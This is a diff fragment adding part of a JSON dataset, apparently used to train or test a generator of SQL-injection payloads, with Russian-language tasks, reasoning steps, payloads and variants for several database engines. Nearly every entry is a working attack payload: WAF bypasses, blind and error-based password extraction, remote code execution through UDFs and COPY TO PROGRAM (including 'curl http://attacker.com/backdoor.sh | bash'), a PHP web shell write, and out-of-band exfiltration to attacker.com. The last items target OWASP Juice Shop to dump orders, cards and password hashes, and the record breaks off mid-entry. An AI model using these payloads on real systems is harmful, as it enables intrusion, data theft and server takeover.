+            "field_type": "integer",
+            "context": "url_parameter",
+            "backend": "mysql",
+            "privileges": "file_priv"
+        },
+        "reasoning": "1. Пользовательские функции для RCE. 2. Компиляция UDF библиотеки. 3. Выполнение sys_exec или sys_eval.",
+        "payload": "1; CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.dll'; SELECT sys_exec('whoami')--",
+        "payload_explained": {
+            "1;": "оригинальный запрос",
+            "CREATE FUNCTION": "создание UDF",
+            "sys_exec": "функция выполнения",
+            "SONAME 'udf.dll'": "библиотека UDF",
+            "SELECT sys_exec()": "вызов функции"
+        },
+        "expected_behavior": "Выполнение команды ОС",
+        "confidence": 0.58,
+        "variants": [
+            "1; SELECT sys_eval('id')--",
+            "1; SELECT lib_mysqludf_sys_info()--"
+        ]
+    },
+    {
+        "id": "sqli_gen_037",
+        "task": "Сгенерировать SQL-инъекцию для обхода через разделители строк",
+        "input": {
+            "field": "comment",
+            "field_type": "string",
+            "context": "textarea",
+            "backend": "mysql",
+            "filter": "blacklist"
+        },
+        "reasoning": "1. Используем переносы строк для обхода. 2. %0a для разделения. 3. Сложные многострочные payload.",
+        "payload": "admin'%0aor%0a1=1%0a--",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "%0a": "перенос строки",
+            "or": "логическое ИЛИ",
+            "1=1": "условие",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Обход фильтров через переносы",
+        "confidence": 0.80,
+        "variants": [
+            "admin'%0d%0aOR%0d%0a1=1--",
+            "admin'%0aUNION%0aSELECT%0anull%0a--"
+        ]
+    },
+    {
+        "id": "sqli_gen_038",
+        "task": "Сгенерировать SQL-инъекцию для Oracle с DBMS_PIPE",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "oracle",
+            "attack_goal": "out_of_band"
+        },
+        "reasoning": "1. Oracle DBMS_PIPE для OOB. 2. Отправка данных через pipe. 3. Требует приемник.",
+        "payload": "admin'||DBMS_PIPE.SEND_MESSAGE('data',5)--",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "||": "конкатенация",
+            "DBMS_PIPE.SEND_MESSAGE()": "отправка по каналу",
+            "'data'": "имя канала",
+            "5": "задержка"
+        },
+        "expected_behavior": "Данные отправлены через pipe",
+        "confidence": 0.67,
+        "variants": [
+            "admin'||UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1))--",
+            "admin'||UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_039",
+        "task": "Сгенерировать SQL-инъекцию для извлечения через битовые операции",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "url_parameter",
+            "backend": "mysql",
+            "attack_goal": "bitwise_extraction"
+        },
+        "reasoning": "1. Битовые операции для извлечения битов. 2. & (AND) для проверки битов. 3. Медленный но точный метод.",
+        "payload": "1 AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1) & 1 = 1",
+        "payload_explained": {
+            "1 AND": "условие",
+            "SELECT ASCII()": "код символа",
+            "& 1": "проверка младшего бита",
+            "= 1": "истина если бит установлен"
+        },
+        "expected_behavior": "Разные результаты для разных битов",
+        "confidence": 0.75,
+        "variants": [
+            "1 AND (SELECT password FROM users LIMIT 1) & 2 = 2",
+            "1 AND ((SELECT password FROM users LIMIT 1) & 4) = 4"
+        ]
+    },
+    {
+        "id": "sqli_gen_040",
+        "task": "Сгенерировать SQL-инъекцию для PostgreSQL с COPY",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "api_endpoint",
+            "backend": "postgresql",
+            "privileges": "superuser"
+        },
+        "reasoning": "1. COPY для чтения/записи файлов. 2. PROGRAM для выполнения команд. 3. Требует superuser.",
+        "payload": "admin'; COPY (SELECT '<?php system($_GET[cmd]);?>') TO '/var/www/html/shell.php'--",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "COPY ... TO": "запись в файл",
+            "SELECT '...'": "содержимое файла",
+            "/var/www/html/shell.php": "целевой путь"
+        },
+        "expected_behavior": "Создание PHP shell",
+        "confidence": 0.63,
+        "variants": [
+            "admin'; COPY (SELECT * FROM users) TO '/tmp/users.csv'--",
+            "admin'; COPY (SELECT 'test') TO PROGRAM 'id > /tmp/out'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_041",
+        "task": "Сгенерировать SQL-инъекцию для обхода через конкатенацию строк",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "mysql",
+            "filter": "keyword_blocked"
+        },
+        "reasoning": "1. Ключевые слова блокируются. 2. Конкатенация обходит сигнатуры. 3. CONCAT или сложение строк.",
+        "payload": "admin' OR '1'='1' AND '1'='1",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "OR '1'='1": "всегда истинно",
+            "AND '1'='1": "дополнительное условие"
+        },
+        "expected_behavior": "Обход аутентификации через конкатенацию условий",
+        "confidence": 0.86,
+        "variants": [
+            "admin' OR '1'='1'/*",
+            "admin' OR '1'='1'#",
+            "admin' OR '1'='1' AND '1'='1"
+        ]
+    },
+    {
+        "id": "sqli_gen_042",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных через DNS (MySQL)",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "url_parameter",
+            "backend": "mysql",
+            "attack_goal": "dns_exfiltration"
+        },
+        "reasoning": "1. DNS эксфильтрация через LOAD_FILE. 2. UNC путь для Windows. 3. Данные в DNS запросе.",
+        "payload": "1 AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\test'))",
+        "payload_explained": {
+            "1 AND": "условие",
+            "LOAD_FILE()": "функция чтения файла",
+            "CONCAT()": "объединение строк",
+            "'\\\\\\\\'": "UNC префикс",
+            "SELECT password": "данные для эксфильтрации",
+            ".attacker.com": "DNS сервер атакующего"
+        },
+        "expected_behavior": "DNS запрос с паролем на attacker.com",
+        "confidence": 0.69,
+        "variants": [
+            "1 AND LOAD_FILE(CONCAT('//',(SELECT database()),'.attacker.com/poc'))",
+            "1 AND (SELECT * FROM (SELECT SLEEP(5))a)"
+        ]
+    },
+    {
+        "id": "sqli_gen_043",
+        "task": "Сгенерировать SQL-инъекцию для MSSQL с OPENROWSET",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "mssql",
+            "attack_goal": "oob_exfiltration"
+        },
+        "reasoning": "1. OPENROWSET для OOB. 2. DNS или HTTP запросы. 3. Эксфильтрация через BULK операцию.",
+        "payload": "' AND 1=(SELECT * FROM OPENROWSET('SQLOLEDB','';'attacker.com';'123','SELECT 1'))--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "AND 1=": "условие",
+            "OPENROWSET()": "функция OOB",
+            "'SQLOLEDB'": "провайдер",
+            "'attacker.com'": "сервер атакующего",
+            "'SELECT 1'": "запрос"
+        },
+        "expected_behavior": "Запрос к внешнему серверу",
+        "confidence": 0.66,
+        "variants": [
+            "'; SELECT * FROM OPENROWSET(BULK '\\\\attacker.com\\share\\file.txt',SINGLE_CLOB) AS a--",
+            "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_044",
+        "task": "Сгенерировать SQL-инъекцию для обхода через шестнадцатеричное кодирование",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "mysql",
+            "filter": "waf_string"
+        },
+        "reasoning": "1. Шестнадцатеричное кодирование. 2. Используем 0x для инъекции. 3. Обход сигнатур WAF.",
+        "payload": "' UNION SELECT 0x61646d696e,0x70617373776f7264--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "0x61646d696e": "hex('admin')",
+            "0x70617373776f7264": "hex('password')",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Вывод данных через hex кодирование",
+        "confidence": 0.84,
+        "variants": [
+            "' UNION SELECT CONCAT(0x61646d696e,0x3a,0x70617373776f7264)--",
+            "' OR username=0x61646d696e--"
+        ]
+    },
+    {
+        "id": "sqli_gen_045",
+        "task": "Сгенерировать SQL-инъекцию для PostgreSQL с generate_series",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "url_parameter",
+            "backend": "postgresql",
+            "attack_goal": "time_based_heavy"
+        },
+        "reasoning": "1. generate_series для создания большой нагрузки. 2. Time-based через тяжелые операции. 3. Имитация задержки.",
+        "payload": "1 AND (SELECT COUNT(*) FROM generate_series(1,10000000))>0",
+        "payload_explained": {
+            "1 AND": "условие",
+            "SELECT COUNT(*)": "подсчет",
+            "FROM generate_series()": "генерация миллионов строк",
+            ">0": "всегда истинно"
+        },
+        "expected_behavior": "Заметная задержка от тяжелого запроса",
+        "confidence": 0.72,
+        "variants": [
+            "1 AND (SELECT pg_sleep(5)) IS NULL",
+            "1 AND (SELECT COUNT(*) FROM (SELECT 1 FROM generate_series(1,10000000))a)>0"
+        ]
+    },
+    {
+        "id": "sqli_gen_046",
+        "task": "Сгенерировать SQL-инъекцию для обхода через обратные кавычки",
+        "input": {
+            "field": "table_name",
+            "field_type": "string",
+            "context": "url_parameter",
+            "backend": "mysql",
+            "filter": "space_blacklist"
+        },
+        "reasoning": "1. Обратные кавычки для обхода. 2. Используются для имен таблиц. 3. Могут заменить пробелы.",
+        "payload": "`table``name`",
+        "payload_explained": {
+            "`table`": "имя таблицы в кавычках",
+            "``": "пустое имя",
+            "`name`": "продолжение имени"
+        },
+        "expected_behavior": "Обход фильтров через обратные кавычки",
+        "confidence": 0.71,
+        "variants": [
+            "`users`",
+            "`admin`--",
+            "`union``select`"
+        ]
+    },
+    {
+        "id": "sqli_gen_047",
+        "task": "Сгенерировать SQL-инъекцию для извлечения через LEAKAGE (HTTP)",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "api_endpoint",
+            "backend": "mysql",
+            "attack_goal": "http_leakage"
+        },
+        "reasoning": "1. HTTP запросы из SQL. 2. UTL_HTTP в MySQL через плагины. 3. Эксфильтрация через GET параметры.",
+        "payload": "' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/http'--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "INTO OUTFILE": "запись в файл",
+            "/tmp/http": "временный файл"
+        },
+        "expected_behavior": "Данные записаны в файл",
+        "confidence": 0.64,
+        "variants": [
+            "' UNION SELECT LOAD_FILE('/tmp/http')--",
+            "' AND 1=1 INTO DUMPFILE '/tmp/out'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_048",
+        "task": "Сгенерировать SQL-инъекцию для SQLite с временными таблицами",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "sqlite",
+            "attack_goal": "table_enumeration"
+        },
+        "reasoning": "1. SQLite временные таблицы. 2. temp.sqlite_master для метаданных. 3. Извлечение схемы.",
+        "payload": "' UNION SELECT sql FROM temp.sqlite_master--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "sql": "поле со схемой",
+            "FROM temp.sqlite_master": "временные метаданные",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Схема временных таблиц",
+        "confidence": 0.78,
+        "variants": [
+            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
+            "' UNION SELECT tbl_name FROM sqlite_temp_master--"
+        ]
+    },
+    {
+        "id": "sqli_gen_049",
+        "task": "Сгенерировать SQL-инъекцию для обхода через CASE",
+        "input": {
+            "field": "sort",
+            "field_type": "string",
+            "context": "order_by",
+            "backend": "mysql",
+            "filter": "keyword_blocked"
+        },
+        "reasoning": "1. CASE для условной логики. 2. Обход блокировки WHERE. 3. Boolean blind через сортировку.",
+        "payload": "(CASE WHEN (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1)=97 THEN id ELSE name END)",
+        "payload_explained": {
+            "CASE WHEN": "условное выражение",
+            "SELECT ASCII()": "извлечение символа",
+            "=97": "проверка на 'a'",
+            "THEN id": "сортировка по id",
+            "ELSE name": "сортировка по name"
+        },
+        "expected_behavior": "Разный порядок сортировки",
+        "confidence": 0.79,
+        "variants": [
+            "(SELECT CASE WHEN 1=1 THEN id ELSE name END)",
+            "(IF(1=1,id,name))"
+        ]
+    },
+    {
+        "id": "sqli_gen_050",
+        "task": "Сгенерировать SQL-инъекцию для Oracle с CTE (WITH)",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "oracle",
+            "attack_goal": "data_extraction"
+        },
+        "reasoning": "1. CTE для сложных запросов. 2. Рекурсивные запросы. 3. Извлечение данных через WITH.",
+        "payload": "admin' WITH data AS (SELECT username FROM users WHERE username='admin') SELECT * FROM data--",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "WITH data AS": "CTE определение",
+            "SELECT username": "выбор данных",
+            "SELECT * FROM data": "использование CTE",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Извлечение данных через CTE",
+        "confidence": 0.76,
+        "variants": [
+            "admin' WITH RECURSIVE cte(n) AS (SELECT 1 FROM dual UNION ALL SELECT n+1 FROM cte WHERE n<10) SELECT * FROM cte--",
+            "' UNION WITH t AS (SELECT 1 FROM dual) SELECT * FROM t--"
+        ]
+    },
+    {
+        "id": "sqli_gen_051",
+        "task": "Сгенерировать SQL-инъекцию для обхода через символы Юникода",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "mysql",
+            "filter": "waf_unicode"
+        },
+        "reasoning": "1. Юникод символы для обхода. 2. %c0%a7 для апострофа. 3. Обход WAF через нормализацию.",
+        "payload": "admin%c0%a7 or 1=1 --",
+        "payload_explained": {
+            "admin": "имя пользователя",
+            "%c0%a7": "юникод апострофа (U+00A7)",
+            "or 1=1": "условие",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Обход WAF через юникод",
+        "confidence": 0.68,
+        "variants": [
+            "admin%c2%bc or 1=1--",
+            "admin%ef%bc%87 or 1=1--",
+            "admin%u0027 or 1=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_052",
+        "task": "Сгенерировать SQL-инъекцию для извлечения через XML функции",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "url_parameter",
+            "backend": "mysql",
+            "attack_goal": "error_based_xml"
+        },
+        "reasoning": "1. XML функции для error-based. 2. extractvalue и updatexml. 3. Вывод данных в ошибках.",
+        "payload": "1 AND extractvalue(1,concat(0x7e,mid((SELECT GROUP_CONCAT(username,0x3a,password) FROM users),1,32),0x7e))",
+        "payload_explained": {
+            "1 AND": "условие",
+            "extractvalue()": "XML функция",
+            "concat()": "объединение",
+            "mid()": "ограничение длины",
+            "GROUP_CONCAT()": "конкатенация всех пользователей"
+        },
+        "expected_behavior": "Ошибка с данными пользователей",
+        "confidence": 0.83,
+        "variants": [
+            "1 AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)",
+            "1 AND (SELECT * FROM (SELECT(1))x)"
+        ]
+    },
+    {
+        "id": "sqli_gen_053",
+        "task": "Сгенерировать SQL-инъекцию для PostgreSQL с регулярными выражениями",
+        "input": {
+            "field": "email",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "postgresql",
+            "attack_goal": "blind_regex"
+        },
+        "reasoning": "1. Регулярные выражения для blind. 2. ~ оператор для совпадения. 3. Поиск по шаблону.",
+        "payload": "admin' AND username ~ '^a' AND '1'='1",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "AND username ~ '^a'": "проверка начала на 'a'",
+            "AND '1'='1": "завершение"
+        },
+        "expected_behavior": "Разные результаты для разных regex",
+        "confidence": 0.77,
+        "variants": [
+            "' OR username ~* '^[a-z]+'--",
+            "' AND email ~ '.*@.*' AND '1'='1"
+        ]
+    },
+    {
+        "id": "sqli_gen_054",
+        "task": "Сгенерировать SQL-инъекцию для обхода через двойные кавычки",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "mysql",
+            "quotes": "double"
+        },
+        "reasoning": "1. Двойные кавычки вместо одинарных. 2. Для контекстов с \" строкой. 3. Обход если проверяют только '.",
+        "payload": "admin\" or 1=1 --",
+        "payload_explained": {
+            "admin\"": "закрывает двойные кавычки",
+            "or 1=1": "условие",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Обход аутентификации через двойные кавычки",
+        "confidence": 0.89,
+        "variants": [
+            "admin\" or \"1\"=\"1",
+            "admin\"--",
+            "\" or 1=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_055",
+        "task": "Сгенерировать SQL-инъекцию для MySQL с геометрическими функциями",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "url_parameter",
+            "backend": "mysql",
+            "attack_goal": "error_based_geometry"
+        },
+        "reasoning": "1. Геометрические функции для error-based. 2. ST_LatFromGeoHash, ST_PointFromGeoHash. 3. Вывод данных в ошибках.",
+        "payload": "1 AND ST_LatFromGeoHash(CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e))",
+        "payload_explained": {
+            "1 AND": "условие",
+            "ST_LatFromGeoHash()": "геометрическая функция",
+            "CONCAT()": "объединение с данными",
+            "SELECT password": "целевые данные"
+        },
+        "expected_behavior": "Ошибка с данными",
+        "confidence": 0.74,
+        "variants": [
+            "1 AND ST_PointFromGeoHash((SELECT password FROM users LIMIT 1))",
+            "1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT user()),0x7e),1)"
+        ]
+    },
+    {
+        "id": "sqli_gen_056",
+        "task": "Сгенерировать SQL-инъекцию для MSSQL с BULK INSERT",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "mssql",
+            "privileges": "bulkadmin"
+        },
+        "reasoning": "1. BULK INSERT для чтения файлов. 2. Чтение конфиденциальных файлов. 3. Вывод в видимую таблицу.",
+        "payload": "'; CREATE TABLE #temp (line varchar(8000)); BULK INSERT #temp FROM 'C:\\Windows\\win.ini'; SELECT * FROM #temp--",
+        "payload_explained": {
+            "';": "закрывает строку",
+            "CREATE TABLE": "временная таблица",
+            "BULK INSERT": "загрузка файла",
+            "FROM 'C:\\Windows\\win.ini'": "целевой файл",
+            "SELECT * FROM #temp": "вывод данных"
+        },
+        "expected_behavior": "Содержимое файла в ответе",
+        "confidence": 0.70,
+        "variants": [
+            "'; BULK INSERT #temp FROM 'C:\\inetpub\\wwwroot\\web.config'--",
+            "'; SELECT * FROM OPENROWSET(BULK 'C:\\Windows\\System32\\drivers\\etc\\hosts', SINGLE_CLOB) AS a--"
+        ]
+    },
+    {
+        "id": "sqli_gen_057",
+        "task": "Сгенерировать SQL-инъекцию для обхода через AND/OR с инверсией",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "mysql",
+            "filter": "and_or_blocked"
+        },
+        "reasoning": "1. AND/OR заблокированы. 2. Используем && и ||. 3. Альтернативные операторы.",
+        "payload": "admin' && 1=1 --",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "&&": "логическое И (альтернатива)",
+            "1=1": "всегда истинно",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Обход блокировки AND/OR",
+        "confidence": 0.85,
+        "variants": [
+            "admin' || 1=1--",
+            "admin' && '1'='1",
+            "admin' xor 1=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_058",
+        "task": "Сгенерировать SQL-инъекцию для извлечения через IN()",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "url_parameter",
+            "backend": "mysql",
+            "attack_goal": "blind_injection"
+        },
+        "reasoning": "1. IN() оператор для blind. 2. Подзапрос для извлечения. 3. Boolean-based через IN.",
+        "payload": "1 AND (SELECT password FROM users WHERE id=1) IN ('a')",
+        "payload_explained": {
+            "1 AND": "условие",
+            "SELECT password": "целевые данные",
+            "IN ('a')": "проверка на 'a'",
+            "результат": "истина если пароль 'a'"
+        },
+        "expected_behavior": "Разные результаты для разных значений",
+        "confidence": 0.78,
+        "variants": [
+            "1 AND (SELECT username FROM users LIMIT 1) IN ('admin')",
+            "1 AND 1 IN (SELECT 1 FROM users WHERE password LIKE 'a%')"
+        ]
+    },
+    {
+        "id": "sqli_gen_059",
+        "task": "Сгенерировать SQL-инъекцию для Oracle с UTL_HTTP",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "oracle",
+            "attack_goal": "http_outbound"
+        },
+        "reasoning": "1. UTL_HTTP для HTTP запросов. 2. OOB эксфильтрация данных. 3. Отправка на сервер атакующего.",
+        "payload": "admin'||UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1))--",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "||": "конкатенация",
+            "UTL_HTTP.REQUEST()": "HTTP запрос",
+            "'http://attacker.com/'": "сервер атакующего",
+            "SELECT password": "данные для эксфильтрации"
+        },
+        "expected_behavior": "HTTP запрос на attacker.com с паролем",
+        "confidence": 0.71,
+        "variants": [
+            "admin'||UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT database() FROM dual))--",
+            "admin'||UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_060",
+        "task": "Сгенерировать SQL-инъекцию для обхода через символы табуляции",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "mysql",
+            "filter": "space_blocked"
+        },
+        "reasoning": "1. Табуляция вместо пробелов. 2. %09 для HTTP. 3. Обход фильтров пробелов.",
+        "payload": "admin'%09or%091=1--",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "%09": "табуляция",
+            "or": "логическое ИЛИ",
+            "1=1": "условие",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Обход фильтров пробелов",
+        "confidence": 0.86,
+        "variants": [
+            "admin'%0cor%0c1=1--",
+            "admin'%09union%09select%09null--",
+            "admin'\tor\t1=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_061",
+        "task": "Сгенерировать SQL-инъекцию для PostgreSQL с COPY TO PROGRAM",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "api_endpoint",
+            "backend": "postgresql",
+            "privileges": "superuser"
+        },
+        "reasoning": "1. COPY TO PROGRAM для RCE. 2. Выполнение команд ОС. 3. Требует superuser права.",
+        "payload": "admin'; COPY (SELECT 'test') TO PROGRAM 'curl http://attacker.com/backdoor.sh | bash'--",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "COPY TO PROGRAM": "выполнение программы",
+            "curl http://attacker.com/backdoor.sh": "скачивание скрипта",
+            "| bash": "выполнение"
+        },
+        "expected_behavior": "Выполнение команд ОС",
+        "confidence": 0.61,
+        "variants": [
+            "admin'; COPY (SELECT 'id > /tmp/out') TO PROGRAM 'bash'--",
+            "admin'; COPY (SELECT '<?php system($_GET[cmd]);?>') TO '/var/www/html/shell.php'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_062",
+        "task": "Сгенерировать SQL-инъекцию для извлечения через RLIKE",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "mysql",
+            "attack_goal": "regex_blind"
+        },
+        "reasoning": "1. RLIKE оператор для regex. 2. Boolean blind через регулярки. 3. Поиск по шаблону.",
+        "payload": "' OR username RLIKE '^a' AND '1'='1",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "OR username RLIKE '^a'": "regex проверка",
+            "AND '1'='1": "завершение"
+        },
+        "expected_behavior": "Разные результаты для разных regex",
+        "confidence": 0.79,
+        "variants": [
+            "' AND password RLIKE '[0-9]'--",
+            "' OR email RLIKE '.*@.*\\.com'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_063",
+        "task": "Сгенерировать SQL-инъекцию для обхода через URL кодирование",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "mysql",
+            "filter": "waf_chars"
+        },
+        "reasoning": "1. URL кодирование спецсимволов. 2. %27 для апострофа. 3. Обход WAF проверяющих символы.",
+        "payload": "admin%27%20or%201%3D1%20--",
+        "payload_explained": {
+            "admin%27": "admin'",
+            "%20": "пробел",
+            "or": "логическое ИЛИ",
+            "1%3D1": "1=1",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Обход WAF через URL encode",
+        "confidence": 0.88,
+        "variants": [
+            "admin%2527%2520or%25201%253D1--",
+            "%61%64%6d%69%6e%27%20%6f%72%20%31%3d%31%2d%2d"
+        ]
+    },
+    {
+        "id": "sqli_gen_064",
+        "task": "Сгенерировать SQL-инъекцию для MySQL с JSON_TABLE",
+        "input": {
+            "field": "data",
+            "field_type": "json",
+            "context": "api_post",
+            "backend": "mysql",
+            "version": "8.0+"
+        },
+        "reasoning": "1. JSON_TABLE для работы с JSON. 2. Извлечение данных через JSON пути. 3. Инъекция в JSON значения.",
+        "payload": "{\"username\":\"admin' UNION SELECT password FROM users--\"}",
+        "payload_explained": {
+            "{\"username\":": "JSON объект",
+            "\"admin' UNION SELECT password FROM users--\"": "инъекция в значение",
+            "}": "закрытие JSON"
+        },
+        "expected_behavior": "Выполнение UNION через JSON",
+        "confidence": 0.73,
+        "variants": [
+            "{\"filter\":\"' OR 1=1--\"}",
+            "{\"query\":\"' AND SLEEP(5)--\"}"
+        ]
+    },
+    {
+        "id": "sqli_gen_065",
+        "task": "Сгенерировать SQL-инъекцию для обхода через комментарии в комментариях",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "mysql",
+            "filter": "comment_blocked"
+        },
+        "reasoning": "1. Вложенные комментарии. 2. Обход блокировки комментариев. 3. /*! ... */ для MySQL.",
+        "payload": "admin'/*!50000/*!or*/1=1*/--",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "/*!50000": "MySQL условный комментарий",
+            "/*!or*/": "вложенный комментарий с or",
+            "1=1*/": "условие",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Выполнение вложенных комментариев",
+        "confidence": 0.77,
+        "variants": [
+            "admin'/*/*/or/*/*/1=1--",
+            "admin'/*!or/*!1=1*/--"
+        ]
+    },
+    {
+        "id": "sqli_gen_066",
+        "task": "Сгенерировать SQL-инъекцию для извлечения всех заказов Juice Shop",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "order_history",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "order_data_extraction"
+        },
+        "reasoning": "1. Эндпоинт /rest/order/:id. 2. UNION для извлечения заказов других пользователей. 3. Таблица Orders содержит платежную информацию.",
+        "payload": "1 UNION SELECT 1,2,3,4,5,6,7,8 FROM Orders--",
+        "payload_explained": {
+            "1": "оригинальный order id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5,6,7,8": "заполнение колонок",
+            "FROM Orders": "таблица заказов",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Данные всех заказов включая чужие",
+        "confidence": 0.86,
+        "variants": [
+            "1 UNION SELECT id,userId,total,paymentId,status,createdAt,updatedAt,deliveryAddress FROM Orders",
+            "2 AND 1=2 UNION SELECT * FROM Orders"
+        ]
+    },
+    {
+        "id": "sqli_gen_067",
+        "task": "Сгенерировать SQL-инъекцию для извлечения адресов доставки",
+        "input": {
+            "field": "userId",
+            "field_type": "integer",
+            "context": "address_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "address_enumeration"
+        },
+        "reasoning": "1. API адресов доставки. 2. Извлечение всех адресов пользователей. 3. Включая персональные данные.",
+        "payload": "1 UNION SELECT 1,2,3,4,5,6,7 FROM Addresses--",
+        "payload_explained": {
+            "1": "оригинальный userId",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5,6,7": "заполнение колонок",
+            "FROM Addresses": "таблица адресов",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Вывод всех адресов доставки",
+        "confidence": 0.84,
+        "variants": [
+            "1 UNION SELECT id,userId,fullName,mobile,addressLine1,addressLine2,city FROM Addresses",
+            "' UNION SELECT * FROM Addresses--"
+        ]
+    },
+    {
+        "id": "sqli_gen_068",
+        "task": "Сгенерировать SQL-инъекцию для извлечения карт оплаты",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "payment_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "credit_card_extraction"
+        },
+        "reasoning": "1. API платежных методов. 2. Извлечение данных кредитных карт. 3. Чувствительная финансовая информация.",
+        "payload": "1 UNION SELECT 1,2,3,4,5,6 FROM Cards--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5,6": "заполнение колонок",
+            "FROM Cards": "таблица карт",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Номера карт и CVV всех пользователей",
+        "confidence": 0.82,
+        "variants": [
+            "1 UNION SELECT id,userId,fullName,cardNum,expMonth,expYear FROM Cards",
+            "1 AND 1=2 UNION SELECT * FROM Cards"
+        ]
+    },
+    {
+        "id": "sqli_gen_069",
+        "task": "Сгенерировать SQL-инъекцию для извлечения хэшей паролей",
+        "input": {
+            "field": "email",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "password_hash_extraction"
+        },
+        "reasoning": "1. Juice Shop хранит пароли в хэшированном виде. 2. Извлечение хэшей для офлайн взлома. 3. Требуется знание схемы таблицы Users.",
+        "payload": "' UNION SELECT 1,email,password,role FROM Users--",
